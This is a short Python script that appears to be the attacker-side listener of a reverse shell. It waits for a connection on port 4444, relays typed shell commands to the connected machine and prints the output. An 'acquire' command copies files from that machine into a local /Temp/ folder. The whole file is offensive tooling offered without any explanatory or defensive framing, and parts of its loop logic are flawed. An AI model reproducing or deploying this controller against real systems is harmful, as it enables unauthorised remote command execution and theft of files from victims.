#!/usr/bin/env python

import socket
import os 

def Transfer(connection,command):
    #
    connection.send(command.encode())
    #
    acquire,path = command.split("*")
    #
    fileObject = open("/Temp/"+path,'wb')
    #
    while(True):
        #
        bits = connection.recv(1024)
        #
        if(bits.endswith('DONE'.encode())):
            #
            fileObject.write(bits[:-4])
            #
            fileObject.close()
            #
            print("[*] Transfer complete ")
            #
            break
            #
        if('File not found'.encode() in bits):
            #
            print("[!] Unable to locate the file ")
            #
        fileObject.write(bits)

def Connection():
    #
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #
    s.bind(('127.0.0.1',4444))
    #
    s.listen(1)
    #
    print("[*] Listening for an incoming connection...")
    #
    connection,address = s.accept()
    #
    if(address):
        #
        print("[*] Connection from ", address)
        #
    while(True):
        #
        command = input("[*]>>>")
        #
        if('exit' in command):
            #
            connection.send('exit'.encode())
            #
        elif('acquire' in command):
            #
            Transfer(connection,command)
            #
        else:
            #
            connection.send(command.encode())
            #
            print(connection.recv(1024).decode())

def main():
    #
    Connection()

if(__name__ == '__main__'):
    #
    main()           
